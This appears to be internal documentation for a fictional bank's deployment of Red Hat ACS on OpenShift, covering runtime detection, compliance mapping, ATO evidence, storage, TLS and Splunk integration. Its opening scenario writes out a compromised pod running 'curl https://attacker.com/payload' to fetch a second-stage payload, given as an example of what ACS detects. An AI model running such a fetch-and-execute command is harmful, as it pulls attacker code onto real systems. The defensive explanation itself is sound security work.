The key insight — what ACS adds that no other tool in the stack provides
NovaCrestBank already has NSX-05 DFW for network security, Harbor Trivy for vulnerability scanning, OCP RBAC for access control, and cert-manager for TLS. What gap does ACS fill?
Every tool listed above is a preventive control — they try to stop bad things from entering the cluster before they happen. ACS is a detective and responsive control — it watches what is actually happening inside the cluster at runtime and alerts on, or blocks, suspicious behaviour regardless of how it got past the preventive controls.

Consider this concrete scenario: a banking application pod has been running cleanly for weeks. A developer accidentally commits a Log4Shell-vulnerable dependency. An attacker exploits it. The compromised pod begins executing curl https://attacker.com/payload to download a second-stage payload. At this point: Harbor Trivy does not catch this — the scan happened at push time, before the exploit. NSX-05 DFW may or may not have a rule blocking this specific egress domain. OCP RBAC has no visibility into what processes run inside running pods. cert-manager is managing certificates. None of these tools sees what is happening inside the running pod.

ACS, however, has been building a behavioural baseline for this pod. It knows that this pod has never executed curl, has never spawned a child process, and has never made an outbound connection to a non-approved IP. The moment the exploit fires, ACS detects the unexpected process execution (curl running inside a Java container), the unexpected network connection to an external IP, and the unexpected file write (/tmp/payload.sh). It creates a runtime alert within seconds, forwards it to Splunk, and — if the policy is configured in Enforce mode — kills the pod.

This is what ACS uniquely provides: visibility and control inside running pods that no network-layer or configuration-layer tool can provide.

The four pillars — what each one does for NovaCrestBank

1
Runtime threat detection
ACS deploys a collector DaemonSet on every node that uses eBPF (extended Berkeley Packet Filter) or kernel modules to observe system calls at the OS level — not just network traffic, but every process execution, file access, and network connection made by every container. It builds a behavioural baseline per deployment and alerts when containers deviate from their known-good behaviour: unexpected process executions (a shell running inside a Python service), unexpected network connections (a database pod connecting to an external IP), unexpected file writes (a read-only service writing to /tmp).
2
Continuous vulnerability management
Harbor Trivy scans images on push — at a single point in time. ACS continuously scans all images currently running in the cluster against updated CVE databases. When the NVD publishes a new critical CVE, ACS identifies every running pod in NovaCrestBank's OCP cluster that is affected — within hours of the CVE publication — without waiting for any new image push. This is the difference between "was clean when pushed" and "is clean right now."
3
Network policy generation and enforcement
ACS observes all actual network connections between pods over an observation period (typically 2–4 weeks) and generates recommended OCP NetworkPolicy objects based on what it observed. This is how NovaCrestBank establishes its initial NetworkPolicy baseline without guessing or manually analysing every microservice's dependencies. ACS also enforces network policies at the cluster level using its sensor, blocking connections that violate policy even when Kubernetes NetworkPolicy is not yet in place.
4
Compliance reporting and policy enforcement
ACS runs automated compliance checks against CIS Kubernetes Benchmark, PCI-DSS, NIST SP 800-190, and HIPAA frameworks. It generates structured compliance reports mapping each control to a Pass/Fail result with evidence. These reports feed directly into ATO and PCI-DSS audit packages. ACS security policies can also block deployments at admission time — before a non-compliant workload ever runs — by integrating with OCP's admission webhooks.

Architecture — Central, SecuredCluster, and what runs on every node
ACS has a two-tier architecture. Understanding exactly what each component does and where it runs prevents confusion during installation and makes troubleshooting straightforward.
The Central + SecuredCluster architecture — why two tiers?
Why does ACS have two separate components — Central and SecuredCluster — rather than a single installation?
The two-tier design reflects the two distinct jobs ACS performs. Central is the brain — it stores all security data, runs the policy engine, hosts the web UI, and communicates with your SIEM. It runs once per environment. SecuredCluster is the nervous system — it deploys sensors and collectors to the clusters being monitored and sends data back to Central. This separation allows one Central to monitor multiple OCP clusters, and allows Central to be upgraded independently of the sensors on each cluster.

In NovaCrestBank's single-cluster deployment, both Central and SecuredCluster run on the same OCP cluster — which is a valid and common configuration for environments that have one cluster. Central runs in the stackrox namespace as a Deployment. SecuredCluster installs a Sensor Deployment (the cluster-level agent) and a Collector DaemonSet (one pod per node) in the same namespace.

The data flow: The Collector on each node observes system calls from every container using eBPF probes. It sends raw events to the Sensor. The Sensor correlates events, applies the behavioural baseline, and determines whether to create a runtime alert. Alerts and vulnerability data flow to Central over mTLS. Central stores everything in its embedded database (PostgreSQL), runs compliance checks, and exposes the web UI and gRPC API. When an alert fires, Central forwards it to Splunk via the configured notification integration.

PCI-DSS v4.0 — the most operationally demanding for NovaCrestBank

What PCI-DSS is and why it applies
PCI-DSS (Payment Card Industry Data Security Standard) is a mandatory security standard for any organisation that stores, processes, or transmits cardholder data — credit and debit card numbers and associated data. NovaCrestBank processes payment card transactions. Any OCP workload that handles card data, or is on the same network segment as a system that does, falls within the PCI-DSS scope. Failure to comply can result in fines from card brands (Visa, Mastercard), loss of the ability to process card payments, and regulatory action. PCI-DSS v4.0 became fully enforceable in March 2025.

FedRAMP — when it applies and what it means

FedRAMP applicability for NovaCrestBank
FedRAMP (Federal Risk and Authorization Management Program) is mandatory if NovaCrestBank provides cloud services to U.S. federal agencies or processes federal government data on their behalf. If NovaCrestBank is a purely commercial bank with no federal contracts, FedRAMP authorisation is not required. However, if NovaCrestBank holds any Treasury, Federal Reserve, or federal agency accounts, FedRAMP controls may apply to those systems. FedRAMP is built on NIST SP 800-53 — every NIST control ACS satisfies contributes to FedRAMP compliance. Red Hat ACS is itself available on FedRAMP-authorised infrastructure (RHACS is included in Red Hat's FedRAMP authorisation package), which strengthens NovaCrestBank's own FedRAMP evidence package if that path is pursued.

FFIEC — what bank examiners look for

FFIEC is an examination standard, not a certification — but failing it has regulatory consequences
The FFIEC (Federal Financial Institutions Examination Council) produces examination handbooks used by the OCC, FDIC, and Federal Reserve when examining bank IT controls. Unlike PCI-DSS, there is no FFIEC certification — instead, bank examiners visit and assess your controls against FFIEC expectations. The FFIEC IT Examination Handbook's "Information Security" booklet specifically addresses: patch management, vulnerability scanning, intrusion detection, and log management. ACS's continuous scanning, runtime detection, and SIEM forwarding directly address what examiners expect to see. The ACS compliance dashboard reports are audit-ready evidence for FFIEC examinations.

SOC 2 Type II — evidence for enterprise customers

SOC 2 Type II requires a third-party auditor to attest that security controls were operating effectively over a period (typically 12 months). ACS contributes to three of the five Trust Service Criteria: Security (CC6 — Logical and Physical Access Controls: ACS admission controller, runtime policy enforcement), Availability (A1 — Capacity and Performance: ACS detects resource-exhausting processes), and Confidentiality (C1 — Confidential Information: ACS detects unexpected data exfiltration attempts via runtime network monitoring).

DORA — EU Digital Operational Resilience Act

DORA applies to any financial entity operating in the EU or serving EU customers, from January 2025. It requires demonstrable ICT risk management, incident detection, response, and recovery capabilities. ACS's runtime detection and SIEM integration directly address DORA Article 17 (ICT-related incident management) and Article 25 (advanced threat-led penetration testing — ACS continuous monitoring provides ongoing threat detection that supports DORA's TLPT requirements).

ACS and ATO — how ACS evidence satisfies authorisation requirements
You were right that ACS contributes to an ATO. This section explains exactly what an ATO is, who issues it, what evidence it requires, and how ACS's specific outputs map to that evidence — in practical terms, not theory.
What an ATO is and why ACS directly contributes to obtaining one
What exactly is an ATO and how does ACS help obtain or maintain it?
An Authority to Operate (ATO) is a formal written authorisation — typically from a Chief Information Security Officer, Chief Risk Officer, or a designated Authorising Official — that a specific system is approved to operate because its security risks have been assessed, understood, and accepted by the authorising authority. ATOs are most formally associated with U.S. government systems (where they are required by FISMA — the Federal Information Security Management Act) but the same concept applies in banking under different names: a bank's core system goes through a security review and risk acceptance process that is functionally an ATO.

To obtain an ATO, you must produce a System Security Plan (SSP) that documents every security control implemented, how it is implemented, who is responsible, and how it is tested. The authorising official then reviews the SSP, residual risk, and the Plan of Action and Milestones (POA&M) for unimplemented controls, and decides whether to authorise the system.

ACS contributes to an ATO in four specific ways:

1. Evidence generation. ACS compliance scan results (CIS Benchmark, PCI-DSS, NIST) provide machine-readable, timestamped evidence that specific controls are implemented and operating. This feeds directly into the SSP's control implementation statements — "Control RA-5 (Vulnerability Scanning) is implemented by Red Hat ACS, which continuously scans all running images against NVD and RHSA CVE databases. Scan results are available at [ACS dashboard URL] and forwarded to Splunk."

2. Continuous monitoring. ATOs in modern frameworks (FedRAMP, FISMA, and increasingly bank regulatory frameworks) require not just a point-in-time assessment but continuous monitoring — ongoing evidence that controls remain effective. ACS provides this: real-time runtime alerts, daily vulnerability scan results, and compliance dashboard snapshots that can be submitted as continuous monitoring artefacts without manual effort.

3. Control inheritance. Red Hat ACS is included in Red Hat's own FedRAMP authorisation package. When NovaCrestBank uses RHACS, it can inherit some of Red Hat's control implementations — reducing the number of controls NovaCrestBank must independently implement and document.

4. Audit readiness. ACS generates compliance reports that are structurally aligned with NIST 800-53 controls, PCI-DSS requirements, and CIS Benchmarks. These reports can be exported as PDFs and submitted directly to auditors, assessors, and authorising officials as evidence artefacts.

OCP-OPS-03 · Section 08
Deploy Central — the ACS management plane
The Central Custom Resource tells the ACS operator to deploy the Central management plane — the web UI, policy engine, scanner, and PostgreSQL database. Every field is annotated with its purpose and the reasoning behind the NovaCrestBank-specific values.
Central storage — why vsan-gold with Retain policy for the ACS database
Central DB requires persistent storage. Why vsan-gold (Retain, RAID-6, thick provisioned) rather than vsan-standard?
Central's PostgreSQL database stores the entirety of ACS's operational data: all runtime alerts (which are PCI-DSS and NIST audit evidence), all vulnerability scan results (which feed into the quarterly vulnerability management report), all compliance scan results, and the network graph baseline used to generate NetworkPolicy. Losing this data means losing compliance audit evidence that cannot be recreated retroactively.

With vsan-standard's Delete reclaim policy, if the Central DB PVC is accidentally deleted (by an operator upgrade gone wrong, by an erroneous oc delete pvc, by an OCP upgrade issue), the VMDK is immediately destroyed — all historical alert data and compliance scan history is gone. With vsan-gold's Retain policy, the VMDK survives PVC deletion. An admin must explicitly delete the PV after confirming data is either backed up or no longer needed. This is the same reasoning that applies to NovaCrestBank's banking database storage.

OCP-OPS-03 · Section 09
Central TLS certificates via cert-manager
Central exposes three TLS endpoints: the web UI (HTTPS), the gRPC API (used by sensors and the roxctl CLI), and the Central-to-DB connection. All three are issued by cert-manager using the novacrestbank-issuer ClusterIssuer — replacing the self-signed certificates ACS generates by default.
Why replacing ACS's self-signed certificates matters
By default ACS generates its own self-signed certificates. These work functionally but present three problems in NovaCrestBank's environment. First, the ACS web UI shows a browser warning to every SOC analyst who visits it — unprofessional and training analysts to ignore certificate warnings. Second, the roxctl CLI requires a special --insecure flag when connecting to an ACS instance with a self-signed cert — this flag disables certificate verification entirely, creating a man-in-the-middle attack surface on the CLI connection. Third, PCI-DSS Req 4.2.1 requires valid certificates on all data-in-transit — self-signed certificates signed by no recognised CA are arguable non-compliance. cert-manager issues IssuingCA-signed certificates that resolve all three problems.

OCP-OPS-03 · Section 11
Runtime threat detection — process and network anomaly alerts
Once the Collector DaemonSet is running, ACS begins building behavioural baselines for every pod. After the baseline period (typically 3–7 days), it alerts on deviations. This section explains exactly what ACS sees, how the baseline works, and what the SOC analyst sees in the ACS console and Splunk.
What the eBPF collector sees — inside a running container
The eBPF collector runs on the node, not inside containers. How does it see what is happening inside a container?
eBPF (extended Berkeley Packet Filter) is a Linux kernel technology that allows small programs to run inside the kernel — safely, without modifying kernel source code or loading kernel modules. The ACS Collector deploys an eBPF probe that attaches to Linux system call trace points. Every container on the node uses the same Linux kernel, and every action a containerised process takes — opening a file, making a network connection, spawning a child process — goes through a system call. The eBPF probe intercepts these system calls at the kernel level before they even complete, giving the Collector visibility into every process execution, network connection, and file access made by every container on that node.

The Collector receives a stream of raw system call events: execve("/bin/bash", ...), connect(10.50.0.44:5432, ...), open("/tmp/suspicious.sh", O_WRONLY). It enriches these with container metadata (which pod, which namespace, which deployment) from the Kubernetes API. It sends the enriched events to Sensor. Sensor correlates them with the behavioural baseline and determines whether to create a runtime alert.

The baseline: For the first few days, ACS learns what "normal" looks like for each Deployment. A Java payment-service that normally executes only the JVM — Sensor learns this. A Python API that normally makes connections only to the database on port 5432 — Sensor learns this. After the baseline period, any deviation creates an alert: the JVM spawning a bash shell, the Python API connecting to an external IP on port 80.

Could NovaCrestBank write NetworkPolicy rules manually based on the application architecture documentation?

The security team reviews the generated rules for anything suspicious (unexpected external connections, unexpected cross-namespace paths) and applies them — getting both accurate rules and a full audit of actual network traffic patterns as a bonus.

Security policies — blocking non-compliant deployments at admission
After the 2-week baseline observation period, the most critical ACS policies are switched from Inform to Enforce mode. In Enforce mode, the ACS admission controller blocks pod creation requests that violate the policy — before the pod ever runs.
Always observe before enforcing — the mandatory 2-week baseline period
Switching policies directly to Enforce mode before establishing a baseline is how ACS causes production incidents. A policy like "No process execution outside of known process baseline" is extremely valuable — but if it is enforced before the baseline is built, it blocks pods that need perfectly legitimate processes the baseline hasn't seen yet. The pattern for every policy at NovaCrestBank: (1) deploy in Inform mode, (2) observe for 14 days to ensure no false positives in the current environment, (3) raise a change request, (4) switch to Enforce mode in a maintenance window.

What a SIEM is and why Splunk is NovaCrestBank's platform
What is a SIEM, why do banks use Splunk specifically, and what does the integration between ACS and Splunk actually achieve?
A SIEM (Security Information and Event Management) is the security operations centre's central platform for collecting, correlating, and analysing security events from across the entire organisation — network devices, servers, endpoints, cloud workloads, and applications. It is the single pane of glass where a SOC analyst investigates incidents, writes detection rules, and generates compliance reports.

Why Splunk in financial services: Splunk Enterprise Security is the dominant SIEM platform in U.S. banking and financial services. JPMorgan Chase, Goldman Sachs, Bank of America, Citigroup, and the majority of Tier 1 and Tier 2 U.S. banks run Splunk. The reasons: Splunk's SPL (Search Processing Language) query language is highly flexible and well-suited to security analytics. Splunk's financial services app ecosystem includes pre-built dashboards for PCI-DSS, SOX, and FFIEC compliance. Splunk has deep integrations with financial sector threat intelligence feeds. The alternative platforms — IBM QRadar (strong in some European banks), Microsoft Sentinel (growing rapidly in Microsoft-invested banks), and Chronicle (Google, used in some tech-forward fintechs) — are all valid but Splunk dominates the established U.S. banking market. Datadog is an observability platform, not a SIEM — while it can ingest security events, it does not have Splunk's detection rule engine, correlation analytics, or compliance reporting capabilities.

What the ACS → Splunk integration achieves: ACS generates structured JSON security events for every runtime alert, policy violation, image vulnerability finding, and compliance scan result. These events are forwarded to Splunk via the HEC (HTTP Event Collector) protocol — a simple, authenticated HTTPS POST endpoint that Splunk exposes. Splunk indexes the events and makes them searchable. The SOC analyst writes Splunk correlation searches (SPL queries) that alert when ACS events indicate an active incident — for example, "alert if the same container generates more than 3 runtime violations within 10 minutes." Splunk also provides the retention and reporting needed for PCI-DSS Req 10 compliance evidence.
